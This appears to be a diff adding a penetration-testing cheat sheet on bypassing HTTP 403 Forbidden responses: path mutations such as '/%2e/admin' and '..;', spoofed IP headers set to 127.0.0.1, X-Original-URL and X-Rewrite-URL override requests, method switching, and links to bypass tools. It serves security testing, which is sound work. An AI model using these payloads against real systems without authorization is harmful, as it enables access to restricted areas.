@@ -1,0 +1,146 @@
+Adding in URL Paths: 
+Adding this in paths of the URL and the file which is forbidden:
+
+/*
+/%2f/
+/./
+/
+/*/
+
+
+---------------------
+
+http://target.com/admin => 403
+http://target.com/%2e/admin => 200
+http://target.com/secret/. => 200
+http://target.com//secret// => 200
+http://target.com/./secret/.. => 200
+http://target.com/;/secret => 200
+http://target.com/.;/secret => 200
+http://target.com//;//secret => 200
+http://target.com/admin..;/ =>200
+http://target.com/aDmIN    =>200
+
+
+----------------------------
+
+
+Runs with every possible permutation for query-based payloads.
+For instance "https://www.example.com/api/v1/users" with payload "..;" will result in testing the following:
+
+https://www.example.com..;/api/v1/users
+https://www.example.com/api..;/v1/users
+https://www.example.com/api/v1..;/users
+https://www.example.com/..;api/v1/users
+https://www.example.com/api/..;v1/users
+https://www.example.com/api/v1/..;users
+https://www.example.com/api/v1/users/..;
+https://www.example.com/api/v1/users/..;/
+
+
+--------------------------------
+
+
+- Header payloads are added to the original request. In case the header already exists in the original request its value is replaced.
+- For GET requests the extension will try to bypass Forbidden pages by changing the method to POST with an empty body.
+- The extension will attempt to downgrade HTTP/1.1 to HTTP/1.0 and remove all headers as shown by Abbas.heybati
+- Supports manual activation through context menu.
+- Payloads are supplied by the user under dedicated tab, default values are stored in "query payloads.txt" and "header payloads.txt".
+- Issues are added under the Issue Activity tab.
+
+
+
+----------------------------------
+
+Changing the request method type: Changing method from GET to POST , etc can also lead to bypass.
+
+
+-----------------------------------
+TOOL:
+
+4-ZERO-3 :
+https://github.com/Dheerajmadhukar/4-ZERO-3
+
+bypass-403:
+https://github.com/iamj0ker/bypass-403
+
+403bypasser:
+https://github.com/yunemse48/403bypasser
+
+byp4xx:
+https://github.com/lobuhi/byp4xx
+
+------------------------------------
+
+Adding Headers in request :**
+By adding different headers in request with value 127.0.0.1 can also help in bypassing restrictions.
+
+---
+
+X-Custom-IP-Authorization
+
+X-Forwarded-For**
+
+X-Forward-For
+
+X-Remote-IP
+
+X-Originating-IP
+
+X-Remote-Addr
+
+X-Client-IP
+
+X-Real-IP
+
+---
+
+
+Overriding the Target URL via Non-Standard Headers:
+
+X-Original-URL: & X-Rewrite-URL:
+--------
+GET /admin HTTP/1.1
+Host: target.com
+--------
+
+How to apply this:
+---
+GET /anything HTTP/1.1
+Host: target.com
+X-Original-URL: /admin 
+----
+
+or 
+
+---
+GET /anything HTTP/1.1
+Host: target.com
+X-Rewrite-URL: /admin
+---
+
+---------------------------------------------
+
+
+
+site.com/secret –> HTTP 403 Forbidden
+site.com/SECRET –> HTTP 200 OK
+site.com/secret/ –> HTTP 200 OK
+site.com/secret/. –> HTTP 200 OK
+site.com//secret// –> HTTP 200 OK
+site.com/./secret/.. –> HTTP 200 OK
+site.com/;/secret –> HTTP 200 OK
+site.com/.;/secret –> HTTP 200 OK
+site.com//;//secret –> HTTP 200 OK
+site.com/secret.json –> HTTP 200 OK (ruby)
+
+
+---------------------------------
+
+
+
+
+
+
+
+
